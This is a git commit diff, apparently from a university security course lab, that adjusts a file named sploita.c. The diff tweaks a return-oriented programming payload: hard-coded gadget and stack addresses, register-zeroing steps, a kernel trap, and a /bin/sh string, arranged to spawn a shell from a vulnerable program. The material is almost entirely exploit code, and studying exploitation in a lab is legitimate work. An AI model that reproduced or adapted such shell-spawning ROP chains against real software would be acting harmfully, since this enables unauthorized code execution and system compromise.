410a288ebb9eeb7c5903dec33d047fdd2393d2dd
jonathandorsey1 <jonathandorsey@utexas.edu>
2020-10-25 19:32:25 -0500

    trying to pop stack?

--- sploita.c
+++ sploita.c
@@ -35,19 +35,19 @@ int main(void)
                       "\x68\x07\xAD\xBB"
                       "\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB\x8C\x9C\xA9\xBB"
                       "\xD4\xBE\xB3\xBB" // 0 out edx
-                      "\x22\xA4\xBA\xBB\xE4\x28\xBF\xBF" // pop esp into ecx (future address of 0 word 0xbfbf28d8) then move edx (0 word) to addy stored at ecx
+                      "\x22\xA4\xBA\xBB\xEC\x28\xBF\xBF" // pop esp into ecx (future address of 0 word 0xbfbf28d8) then move edx (0 word) to addy stored at ecx
                       "\x7E\xB8\xB6\xBB" // move edx (0 word to y array)
-                      "\x22\xA4\xBA\xBB\xF8\x28\xBF\xBF" // pop esp into ecx (future address of 0 word 0xbfbf28d8) then move edx (0 word) to addy stored at ecx
+                      "\x22\xA4\xBA\xBB\xF4\x28\xBF\xBF" // pop esp into ecx (future address of 0 word 0xbfbf28d8) then move edx (0 word) to addy stored at ecx
                       "\x7E\xB8\xB6\xBB" // move edx (0 word to 3rd param passed to syscall)
-                      "\x62\x26\xB4\xBB" // skip over y array (inc esp by 8)
+                      //"\x62\x26\xB4\xBB" // skip over y array (inc esp by 8)
                       //"\xf6\xf6\xb7\xbb\xAA\xAA\xAA\xAA" // y array (addy of bin/sh followed by 0 word represented here by filler)
                       "\xE5\xB6\xA9\xBB" // trap into kernel followed by
                       "\x01\x01\x01\x01" // dummy value
                       //"\xf6\xf6\xb7\xbb" // addy of bin/sh (x) 
-                      "\xFC\x28\xBF\xBF" // addy of bin/sh (x) 
+                      "\xF8\x28\xBF\xBF" // addy of bin/sh (x) 
                       "\xE0\x28\xBF\xBF" // addy of y
                       "\xAA\xAA\xAA\xAA" // filler for 0 bytes
-                      "\xFC\x28\xBF\xBF\xAA\xAA\xAA\xAA" // y array (addy of bin/sh followed by 0 word represented here by filler)
+                      "\xF8\x28\xBF\xBF\xAA\xAA\xAA\xAA" // y array (addy of bin/sh followed by 0 word represented here by filler)
                       "\x2F\x62\x69\x6E\x2f\x73\x68\x00"); // /bin/sh string
       // writecmd(PIPEPATH, "\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09"
       //                 "\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09"
